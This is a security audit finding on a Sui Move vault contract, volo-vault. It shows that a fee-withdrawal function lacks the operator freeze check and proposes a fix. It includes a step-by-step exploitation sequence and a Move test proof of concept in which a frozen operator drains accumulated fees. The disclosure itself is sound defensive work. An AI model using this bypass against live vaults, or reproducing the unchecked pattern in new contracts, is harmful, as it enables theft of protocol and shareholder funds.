# Audit Report

## Title
Frozen Operator Can Bypass Authorization Check to Retrieve Deposit/Withdraw Fees

## Summary
The `retrieve_deposit_withdraw_fee_operator` function fails to verify operator freeze status before allowing fee withdrawal. This authorization bypass allows frozen operators—who have been administratively revoked due to malicious behavior or security concerns—to continue extracting accumulated protocol fees despite being blocked from all other vault operations.

## Finding Description

**Root Cause:**

The `retrieve_deposit_withdraw_fee_operator` function accepts only an `OperatorCap` without requiring the `Operation` shared object as a parameter. [1](#0-0) 

The operator freeze check mechanism requires BOTH parameters to function. [2](#0-1) 

This function checks the `freezed_operators` table stored in the `Operation` shared object. [3](#0-2) 

**Why All Other Operations Are Protected:**

Every other operator-privileged function in the codebase consistently includes the freeze check. For example, `start_op_with_bag` enforces it: [4](#0-3) 

Similarly, `end_op_with_bag` includes the check: [5](#0-4) 

The codebase shows 26 calls to `assert_operator_not_freezed` in operation.move and 14 calls in reward_manager.move, demonstrating consistent enforcement across all other operator functions.

**The Vulnerable Call:**

The function directly calls the underlying vault fee retrieval without any freeze verification. [6](#0-5) 

This underlying function only checks vault version and status—it has no awareness of operator freeze state.

**System Context:**

The protocol includes operator freezing functionality accessible via admin capabilities. [7](#0-6) 

Tests confirm frozen operators should be blocked from all operations. [8](#0-7) 

Fee rates can reach maximum of 5% (500 basis points). [9](#0-8) 

## Impact Explanation

**Direct Financial Loss:**
- Frozen operators can drain all accumulated deposit and withdraw fees from the vault
- These fees represent protocol revenue collected at rates up to 5% of user deposit/withdrawal amounts
- The fees belong to the protocol treasury and vault shareholders

**Security Control Bypass:**
- The operator freeze mechanism is a critical emergency response tool
- Operators are frozen when suspected of malicious activity, when exceeding loss tolerance, or during security investigations
- This bypass completely undermines the freeze protection for one of the most financially sensitive operations

**Trust and Governance Impact:**
- Administrators lose the ability to fully revoke operator privileges in emergency situations
- Frozen operators retain financial extraction capability despite administrative action
- Violates the core security invariant that "frozen operators cannot perform privileged operations"

## Likelihood Explanation

**Trivial Exploitation:**
1. Administrator freezes an operator via `set_operator_freezed` due to suspicious behavior
2. The frozen operator still possesses their `OperatorCap` object (it's not destroyed by freezing)
3. Operator immediately calls `retrieve_deposit_withdraw_fee_operator(&operator_cap, &mut vault, amount)`
4. Transaction succeeds—no `ERR_OPERATOR_FREEZED` error is thrown
5. Frozen operator successfully extracts accumulated fees

**No Barriers to Execution:**
- Function is publicly accessible with standard operator capability
- No time locks or additional authorization requirements
- Only requires vault to be in normal status (not during operation)
- Frozen operators have strong motivation to extract remaining value before capability destruction
- Attack can be executed in a single transaction

## Recommendation

Add the `Operation` parameter to `retrieve_deposit_withdraw_fee_operator` and include the freeze check at the beginning of the function:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,  // Add Operation parameter
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // Add freeze check
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This ensures consistency with all other operator functions in the codebase.

## Proof of Concept

```move
#[test]
fun test_frozen_operator_can_retrieve_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Initialize vault and create operator
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    
    // Set deposit fee and execute deposit to accumulate fees
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        vault_manage::set_deposit_fee(&admin_cap, &mut vault, 100); // 1% fee
        test_scenario::return_shared(vault);
        s.return_to_sender(admin_cap);
    };
    
    // Execute deposit to generate fees
    s.next_tx(USER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        let (_id, receipt, change) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 
            1_000_000_000, 990_000_000, option::none(), &clock, s.ctx()
        );
        
        transfer::public_transfer(receipt, USER);
        transfer::public_transfer(change, USER);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Freeze the operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        
        vault_manage::set_operator_freezed(
            &admin_cap, &mut operation,
            operator_cap.operator_id(), true  // Freeze operator
        );
        
        test_scenario::return_shared(operation);
        s.return_to_sender(admin_cap);
        s.return_to_sender(operator_cap);
    };
    
    // VULNERABILITY: Frozen operator can still retrieve fees
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        
        // This should fail with ERR_OPERATOR_FREEZED but doesn't!
        let fees = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap, &mut vault, 10_000_000  // Retrieve 0.01 SUI fees
        );
        
        assert!(fees.value() == 10_000_000, 0); // Fee extraction succeeds
        
        fees.destroy_for_testing();
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

The test demonstrates that a frozen operator can successfully call `retrieve_deposit_withdraw_fee_operator` and extract accumulated fees, when the function should have aborted with `ERR_OPERATOR_FREEZED` (error code 5_015).

### Citations

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/volo_vault.move (L32-33)
```text
const MAX_DEPOSIT_FEE_RATE: u64 = 500; // max 500bp (5%)
const MAX_WITHDRAW_FEE_RATE: u64 = 500; // max 500bp (5%)
```

**File:** volo-vault/sources/volo_vault.move (L89-92)
```text
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L362-378)
```text
public(package) fun set_operator_freezed(
    operation: &mut Operation,
    op_cap_id: address,
    freezed: bool,
) {
    if (operation.freezed_operators.contains(op_cap_id)) {
        let v = operation.freezed_operators.borrow_mut(op_cap_id);
        *v = freezed;
    } else {
        operation.freezed_operators.add(op_cap_id, freezed);
    };

    emit(OperatorFreezed {
        operator_id: op_cap_id,
        freezed: freezed,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```

**File:** volo-vault/sources/operation.move (L94-105)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L209-218)
```text
public fun end_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    mut defi_assets: Bag,
    tx: TxBag,
    principal_balance: Balance<T>,
    coin_type_asset_balance: Balance<CoinType>,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/tests/operation/operation.test.move (L1561-1597)
```text
#[test]
#[expected_failure(abort_code = vault::ERR_OPERATOR_FREEZED, location = vault)]
// [TEST-CASE: Should do op fail if operator is freezed.] @test-case OPERATION-012
public fun test_start_op_fail_op_freezed() {
    let mut s = test_scenario::begin(OWNER);

    let mut clock = clock::create_for_testing(s.ctx());

    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);

    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();

        let navi_account_cap = lending::create_account(s.ctx());
        vault.add_new_defi_asset(
            0,
            navi_account_cap,
        );
        test_scenario::return_shared(vault);
    };

    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();

        vault_manage::set_operator_freezed(
            &admin_cap,
            &mut operation,
            operator_cap.operator_id(),
            true,
        );
```
